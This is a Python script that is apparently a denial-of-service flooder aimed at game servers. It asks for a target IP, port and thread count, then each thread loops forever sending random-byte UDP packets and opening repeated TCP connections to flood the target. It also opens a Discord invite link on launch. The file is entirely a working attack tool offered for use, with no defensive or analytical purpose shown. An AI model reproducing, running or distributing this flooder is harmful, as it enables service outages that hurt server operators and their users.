import random
import socket
import threading
import os
import sys
import time
from colorama import Fore, init

init()

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

def attack():
    data_udp = random._urandom(1024)
    data_tcp1 = random._urandom(999)
    data_tcp2 = random._urandom(818)
    data_tcp3 = random._urandom(16)
    
    i = random.choice(("[*]","[!]","[#]"))
    
    while True:
        try:
            s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_tcp1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_tcp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_tcp3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            addr = (str(ip),int(port))
            
            s_udp.sendto(data_udp,addr)
            s_tcp1.connect((ip,port))
            s_tcp1.send(data_tcp1)
            s_tcp2.connect((ip,port))
            s_tcp2.send(data_tcp2)
            s_tcp3.connect((ip,port))
            s_tcp3.send(data_tcp3)
            
            print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
        except:
            print("[!] Error!!!")

for y in range(threads):
    th = threading.Thread(target=attack)
    th.start()